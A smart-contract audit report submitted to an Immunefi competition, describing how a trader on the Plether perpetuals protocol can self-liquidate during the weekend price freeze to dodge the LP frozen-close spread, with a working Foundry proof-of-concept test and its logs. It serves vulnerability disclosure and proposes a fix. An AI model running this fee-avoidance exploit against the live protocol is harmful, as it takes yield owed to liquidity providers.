# \#98285 [SC-Medium] Weekend self-liquidation skips the LP frozen-close spread

**Submitted on Nov 6th 2026 at 17:56:59 UTC by @Afriauditor for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98285
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Theft of unclaimed yield

## Description


## Summary

A trader can exit at Friday's frozen price without paying the 50 bps frozen-close spread, which is LP revenue charged on weekend exits. While the price is frozen, only carry moves equity, so the trader can fix in advance when the position falls below the 3% weekend margin.

With the weekend's news in hand, the trader then liquidates their own position at that time, or tops up with `addMargin` and holds into the reopen. Liquidations skip the spread and pay half the liquidation charge back to the caller, so the exit costs about 7 bps instead of 49 bps.

In the PoC, a 100,000 USDG weekend exit leaves LPs 72 USDG instead of 452 USDG. The 380 USDG difference is LP fee yield the trader keeps.

## Description

**1. The spread is LP revenue charged on every voluntary weekend exit.** While `oracleFrozen`, the price is Friday's close, so a trader who knows weekend news can exit before Monday's gap. The 50 bps `frozenCloseSpreadBps` (DEPLOYMENT.md:132) prices that risk. It "applies to voluntary reductions during `oracleFrozen`" (DEPLOYMENT.md:164), is "LP-owned trading revenue" (ACCOUNTING_SPEC.md:1120), and exists to "compensate LPs for voluntary stale-mark exit" (WHITEPAPER.md:814).

**2. Liquidations skip it.** "Liquidation does not assess `frozenCloseSpreadBps`, including while `oracleFrozen`" (ACCOUNTING_SPEC.md:1188; also :156 and :1250). A liquidation pays only the 10 bps liquidation charge (DEPLOYMENT.md:139), and half of it goes to the caller (`keeperShareBps` 5,000, DEPLOYMENT.md:140). The engine explicitly handles a caller who is the liquidated account and still pays it the keeper half (CfdEngine.sol:1331-1338).

**3. During the freeze, the trader decides when, and whether, they are liquidated.**

1. The weekend margin is 3% (`fadMarginBps` 300, DEPLOYMENT.md:136). The mark is frozen, so equity moves only by carry, at a fixed rate.
2. The trader parks equity just above 3% at the freeze. That margin fixes the crossing time, and small top-ups push it later: `addMargin` has no regime gate (CfdEngine.sol:501-527).
3. Bad news by the crossing: the trader calls `router.executeLiquidation` on their own account at Friday's price. Good news: one `addMargin` call, and the position runs into the reopen.

**Root cause.** The exemption assumes a liquidation is forced on the trader. During the freeze it is not: the price cannot move, so only the trader's own margin decides whether and when the threshold is crossed. A liquidation the trader schedules, and can cancel, is a voluntary stale-mark exit, which is exactly what the spread is charged on.

**Why the documented exemption does not cover this.** The spec exempts forced exits from a charge on voluntary exits. It does not let traders choose a liquidation over a close to avoid that charge, and doing so defeats the spread's stated purpose (DEPLOYMENT.md:164, WHITEPAPER.md:814).

**Fix.** While `oracleFrozen`, charge liquidations the larger of the liquidation charge and `frozenCloseSpreadBps`, with the excess going to LPs. Withholding the keeper share when the caller is the liquidated account helps, but a second address still collects it, so that alone is partial.

## Impact

**Severity: High (theft of unclaimed yield).** The frozen-close spread is LP yield the protocol charges on every voluntary weekend exit. Any trader can take it by exiting through a liquidation they schedule themselves; no role, oracle condition or keeper behaviour is needed.

| Weekend exit, 100,000 USDG notional (PoC) | Trader cost (USDG) | LP assets (USDG) | Treasury (USDG) |
| --- | --- | --- | --- |
| Voluntary close | 492.32 (49.2 bps) | +452.32 | +40.00 |
| Self-liquidation | 72.27 (7.2 bps) | +72.27 | 0 |

- LPs lose 380 USDG per 100,000 USDG exited (38 bps), and the treasury loses its 40 USDG fee. At the same skew-to-depth ratio, a 10M USDG weekend exit moves about 38,000 USDG of LP yield to the trader.
- It repeats every weekend, and the trader keeps the choice until the crossing; declining costs one `addMargin` call.
- Precondition: a position held into the freeze with equity parked within a few USDG of the 3% line. Weekend carry on the PoC position is only about 2.7 USDG, so the margin must be set precisely, and the frozen price makes that exact.



## Proof of Concept

## Proof of Concept


The test passes at a82d4fe: the self-liquidation exits the same position at the same frozen price for 72.27 USDG instead of 492.32 USDG. It runs on the repo's `BasePerpTest` fixture with the launch risk parameters, uses the weekend timestamps of the team's `OracleRegimeMatrix.t.sol` (freeze at Friday 17:00 New York), and goes through the public Router for both the close and the liquidation.

```bash
cd packages/perps
forge test --match-path test/poc/WeekendSelfLiquidation.t.sol -vv
```

1. Alice holds 100,000 tokens LONG into the freeze with equity about 2 USDG above the 3% line. With the price frozen, carry alone makes the position liquidatable exactly 40 hours later (Sunday morning New York).
2. From one snapshot an hour before that: (A) she waits and liquidates herself at Friday's price; (B) she closes voluntarily instead; (C) she adds 50 USDG and is still safe at the reopen.

```
[PASS] test_WeekendSelfLiquidationSkipsFrozenCloseSpread() (gas: 8031329)
Logs:
  equity at the freeze (USDG 6dp): 3002735973
  hours after the freeze until liquidatable: 40
  A self-liquidation: trader cost: 72274853
    liquidation charge: 100000000
    keeper half paid back to the trader: 50000000
    LP assets change: 72274853
    treasury credit: 0
  B voluntary weekend close: trader cost: 492323738
    LP assets change: 452323738
    treasury credit: 40000000
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

File: `packages/perps/test/poc/WeekendSelfLiquidation.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice A trader holds a LONG through the weekend freeze with equity just above the 3% weekend margin. Carry is
///         the only thing that moves while the price is frozen, so the time the position becomes liquidatable is
///         fixed by the margin she chose. With weekend news in hand she either self-liquidates at Friday's price
///         (paying the liquidation charge and earning its keeper half back) or tops up and keeps the position.
///         The same exit as a voluntary weekend close pays the 50 bps frozen-close spread that is meant for LPs.
contract WeekendSelfLiquidationTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE);
    address internal constant KEEPER = address(0xE0EC);

    uint256 internal constant BEFORE_FAD = 1_729_283_399; // Fri 2024-10-18 16:29:59 New York (regime matrix anchor)
    uint256 internal constant FREEZE = BEFORE_FAD + 1801; // Fri 17:00 New York: FX closed, price frozen
    uint256 internal constant REOPEN = FREEZE + 48 hours; // Sun 17:00 New York

    uint256 internal constant PRICE = 1e8; // Friday close, unchanged all weekend
    uint256 internal constant SIZE = 100_000e18; // ~100,000 USDG notional
    // Weekend carry on this position is only ~2.7 USDG, so equity is parked ~2 USDG above the 3% line at the freeze.
    // The price is frozen, so this fixes the crossing time (~40 h after the freeze, Sunday morning New York).
    uint256 internal constant MARGIN = 3_212_770_000;

    /// @dev Launch risk parameters from DEPLOYMENT.md; frozenCloseSpreadBps is the fixture's 50 (also the launch value).
    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _fundTrader(ALICE, 10_000e6);
        vm.warp(BEFORE_FAD - 2 hours);
        _open(ALICE, CfdTypes.Side.LONG, SIZE, MARGIN, PRICE); // opened Friday afternoon
        vm.warp(BEFORE_FAD);
        router.updateMarkPrice(_signedLiveData(PRICE, uint64(BEFORE_FAD))); // Friday's last live mark
        vm.warp(FREEZE);
        assertTrue(engine.isOracleFrozen(), "weekend freeze");
    }

    function test_WeekendSelfLiquidationSkipsFrozenCloseSpread() public {
        uint256 liquidationPrice = (PRICE * 10_002) / 10_000; // frozen liquidation price, as in OracleRegimeMatrix
        ICfdEngineTypes.LiquidationPreview memory atFreeze = engineLens.previewLiquidation(ALICE, liquidationPrice);
        console2.log("equity at the freeze (USDG 6dp):", uint256(atFreeze.equityAssets));
        assertFalse(atFreeze.liquidatable, "safe at the freeze");

        // 1. Price is frozen; carry alone decides when the position drops under the 3% weekend margin.
        uint256 crossing;
        for (uint256 h = 1; h <= 48; ++h) {
            vm.warp(FREEZE + h * 1 hours);
            if (engineLens.previewLiquidation(ALICE, liquidationPrice).liquidatable) {
                crossing = FREEZE + h * 1 hours;
                break;
            }
        }
        assertGt(crossing, 0, "liquidatable before the reopen");
        console2.log("hours after the freeze until liquidatable:", (crossing - FREEZE) / 1 hours);

        // The trader decides one hour before the crossing, with the weekend's news known.
        vm.warp(crossing - 1 hours);
        uint256 snapshot = vm.snapshotState();
        address treasury = engine.protocolTreasury();
        uint256 aliceStart = clearinghouse.balanceAssets(ALICE);
        uint256 poolStart = pool.totalAssets();
        uint256 treasuryStart = clearinghouse.balanceAssets(treasury);

        // A. Bad news: wait for the crossing and liquidate herself at Friday's price.
        vm.warp(crossing);
        ICfdEngineTypes.LiquidationPreview memory preview = engineLens.previewLiquidation(ALICE, liquidationPrice);
        vm.prank(ALICE);
        router.executeLiquidation(ALICE, new bytes[](0));
        (uint256 sizeA,,,,,,) = engine.positions(ALICE);
        assertEq(sizeA, 0, "self-liquidated");
        uint256 costA = aliceStart - clearinghouse.balanceAssets(ALICE);
        int256 poolA = int256(pool.totalAssets()) - int256(poolStart);
        uint256 treasuryA = clearinghouse.balanceAssets(treasury) - treasuryStart;

        // B. The same exit as a voluntary weekend close (one hour earlier, so slightly less carry).
        vm.revertToState(snapshot);
        snapshot = vm.snapshotState();
        vm.prank(ALICE);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, SIZE, 0, 0, true);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(PRICE)), -8, block.timestamp);
        bytes[] memory data = _mockPythUpdateData(PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory closed = router.executeOrder(id, data);
        assertEq(uint8(closed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "voluntary close filled");
        (uint256 sizeB,,,,,,) = engine.positions(ALICE);
        assertEq(sizeB, 0, "closed");
        uint256 costB = aliceStart - clearinghouse.balanceAssets(ALICE);
        int256 poolB = int256(pool.totalAssets()) - int256(poolStart);
        uint256 treasuryB = clearinghouse.balanceAssets(treasury) - treasuryStart;

        // C. Good news: a small top-up moves the crossing past the reopen and she keeps the position.
        vm.revertToState(snapshot);
        vm.prank(ALICE);
        engine.addMargin(ALICE, 50e6);
        vm.warp(REOPEN - 1);
        assertFalse(engineLens.previewLiquidation(ALICE, liquidationPrice).liquidatable, "kept into the reopen");

        console2.log("A self-liquidation: trader cost:", costA);
        console2.log("  liquidation charge:", preview.liquidationChargeAssets);
        console2.log("  keeper half paid back to the trader:", preview.keeperBountyAssets);
        console2.log("  LP assets change:", poolA);
        console2.log("  treasury credit:", treasuryA);
        console2.log("B voluntary weekend close: trader cost:", costB);
        console2.log("  LP assets change:", poolB);
        console2.log("  treasury credit:", treasuryB);
        assertLt(costA, costB, "self-liquidation is the cheaper weekend exit");
    }

    function _signedLiveData(
        uint256 price,
        uint64 tick
    ) private pure returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            updates[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, tick, 0));
        }
        data = new bytes[](1);
        data[0] = abi.encode(updates);
    }

}
```

````

